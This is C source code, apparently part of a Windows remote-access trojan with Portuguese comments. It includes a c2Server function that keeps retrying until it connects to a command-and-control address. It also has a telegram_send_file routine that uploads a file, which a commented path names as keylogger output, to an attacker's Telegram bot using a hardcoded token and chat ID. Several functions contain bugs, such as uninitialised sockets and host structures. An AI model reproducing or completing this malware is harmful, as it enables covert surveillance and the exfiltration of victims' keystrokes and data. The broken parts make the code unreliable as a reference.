                #include "network.h"
                #include <string.h>
             //   SOCKET global;
                //ler a documentaçao
                void zero(char * buffer)
                {
                memset(buffer,0,strlen(buffer));


                }
                SOCKET buildsocket(){
                WSADATA wsa;
                SOCKET global;
                if(WSAStartup(MAKEWORD(2,2),&wsa)!=0){
                return(INVALID_SOCKET);
                }

                global=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
                if(socket==INVALID_SOCKET){
                return(INVALID_SOCKET);}

                return(global);

                }
                BOOL c2Server(char *ip,int port,SOCKET s){
                WSADATA wsa;
                struct sockaddr_in cliente;
                struct sockaddr_in *ptr;

                ptr=&cliente;
                cliente.sin_addr.s_addr=inet_addr(ip);
                cliente.sin_family=AF_INET;
                cliente.sin_port=htons(port);
                if(WSAStartup(MAKEWORD(2,2),&wsa)!=0){
                    //printf("erro wsastartup \n");

                }
                while(2){
                        Sleep(5000);
                    if(connect(s,ptr,sizeof cliente)==0){
                        //printf(" conexao aceita \n");
                        break;
                    }
                else{
                    //printf("tentando se conectar \n");
                }
                }


                return TRUE;}//loop   que tenta se conectar
                void  conect_web(char *domain,int port,SOCKET socket){

                WSADATA wsa;
                struct sockaddr_in cliente;
                struct sockaddr_in *ptr;
                SOCKET s;
                struct  hostent  *d;
                domain=gethostbyname(d);
                ptr=&cliente;
                cliente.sin_addr.s_addr=*((unsigned long*)d->h_addr);
                cliente.sin_family=AF_INET;
                cliente.sin_port=htons(port);
                if(WSAStartup(MAKEWORD(2,2),&wsa)!=0){
                    //printf("erro wsastartup \n");

                }
                while(2){
                        Sleep(5000);
                    if(connect(s,ptr,sizeof cliente)==0){
                        //printf(" conexao aceita \n");
                        break;
                    }
                else{
                    //printf("tentando se conectar \n");
                }
                }

                }
                void web_send(char *request,SOCKET web,char *buffer){
                char *domain;//defina seu host
                conect_web(domain,80,web);
                char http[12488];

                zero(http);
                sprintf(http,request,buffer);
                send(web,http,strlen(http),0);
                recv(web,buffer,12488,0);
                 closesocket(web);
                  WSACleanup();
                  Sleep(3000);




                }


                void  http_close(HINTERNET *hinternt,HINTERNET *conect, HINTERNET *request){

            if (hinternt) { InternetCloseHandle(hinternt); }
                if (conect) { InternetCloseHandle(conect); }
                if (request) { InternetCloseHandle(request); }


                }

            char*  read_file(FILE *fin){
           // FILE *fin = fopen(name, "rb");//abrimos o arquivo
                fseek(fin, 0, SEEK_END);//
                long len = ftell(fin);
                rewind(fin);//reposiciona o ponteiro  para o iicio
                char *buffer =(char *) malloc(len+1*sizeof(char ));
                buffer[len]='\0';



                fread(buffer, len, 1, fin);
                fclose(fin);
                return buffer;



            }
                    void telegram_send_file(FILE *fp){
                const char *token="6328567938:AAFScH10hlOHkKymIU_cNaTs93AHQlB7X_I";;

                const char *chat_id="-1001788655910";
                HINTERNET hinternet;
                HINTERNET connect;
                char boundary[]= "---------------------------14737809831466499882746641449";
                char header[1024];
                char data_post[4096];
                DWORD len_data_post;
                char response_buffer[1024];
                DWORD bytes_id;
                char URL[1024];
            //	fp=fopen("C:\\Users\\estan\\OneDrive\\Área de Trabalho\\t\\t.cbp\\Telegram RAT\\keylloger.txt", "a+");
                 fseek(fp, 0, SEEK_END);
                 int fe_size=ftell(fp);
                 rewind(fp);
                 char *file_buffer=(char*)malloc(fe_size+1);
                 fread(file_buffer, 1, fe_size, fp);
                 file_buffer[fe_size]='\0';
                snprintf(URL, sizeof(URL), "https://api.telegram.org/bot%s/sendDocument?chat_id=%s", token, chat_id);
                hinternet=InternetOpen("winnet", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
                 connect = InternetOpenUrl(hinternet, URL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
                  snprintf(header, sizeof(header), "Content-Type: multipart/form-data; boundary=%s", boundary);
                   len_data_post = snprintf(data_post, sizeof(data_post), "--%s\r\nContent-Disposition: form-data; name=\"document\"; filename=\"seuarquivo.txt\"\r\nContent-Type: text/plain\r\n\r\n", boundary);

             memcpy(data_post + len_data_post, file_buffer, fe_size);
             len_data_post+=fe_size;
               len_data_post += snprintf(data_post + len_data_post, sizeof(data_post) - len_data_post, "\r\n--%s--\r\n", boundary);
                HttpSendRequest(connect, header, strlen(header), data_post, len_data_post);
                 InternetReadFile(connect, response_buffer, sizeof(response_buffer), &bytes_id);
                  response_buffer[bytes_id] = '\0';
                   InternetCloseHandle(connect);
                  InternetCloseHandle(hinternet);
                  free(file_buffer);




                }//
